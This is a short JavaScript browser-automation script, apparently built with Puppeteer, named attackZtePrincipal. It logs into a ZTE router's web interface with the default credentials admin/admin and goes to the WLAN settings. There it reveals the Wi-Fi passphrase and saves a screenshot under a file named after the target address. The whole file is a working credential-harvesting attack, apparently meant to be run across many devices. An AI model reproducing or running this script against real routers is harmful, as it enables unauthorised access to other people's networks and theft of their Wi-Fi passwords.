export default async function attackZtePrincipal(page, endereco) {
    {
        await page.focus('#Frm_Username');
        await page.keyboard.type('admin');
    }
    {
        await page.focus("#Frm_Password");
        await page.keyboard.type("admin")
    }
    {
        await page.click("#LoginId")
    }
    {
        await page.waitForTimeout(5000)
        const frame = page.frames()
            .filter(frame => frame.url().includes("template.gch"))[0]

        await frame.addStyleTag({path: 'style.css'})

        await page.waitForTimeout(250);
        await frame.click("#mmNet");

        await page.waitForTimeout(250);
        await frame.click("#smWLAN");

        await page.waitForTimeout(250);
        await frame.click("#Img_KeyPassphrase")
    }
    {
        const enderecoUrlFoto = endereco
            .replace("http://", "");

        await page.screenshot({
            path: `./fotos/${enderecoUrlFoto}.png`,
            fullPage: true
        });
    }
}